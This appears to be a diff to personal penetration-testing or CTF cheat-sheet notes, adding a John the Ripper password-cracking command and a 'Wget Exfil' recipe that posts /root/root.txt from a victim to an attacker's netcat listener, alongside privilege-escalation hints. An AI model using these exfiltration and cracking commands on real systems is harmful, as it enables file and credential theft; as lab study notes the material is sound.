@@ -94,6 +94,13 @@ Enum Notes:
   - To create shell as another user: sudo -u <username> /bin/bash
   - List all process: ps aux
   - Simple Prive Esc: sudo -l 
+
+John: 
+	- john --worldlist=rockyou.txt <hash file>
+		- john --show <hash file>
+Wget Exfil:
+	- On your machine: nc -lnvp 80
+	- On victim: wget --post-file=/root/root.txt <attacker IP>
   
 Use scp to download files via ssh
      - sudo scp root@192.168.100.22:/etc/file .
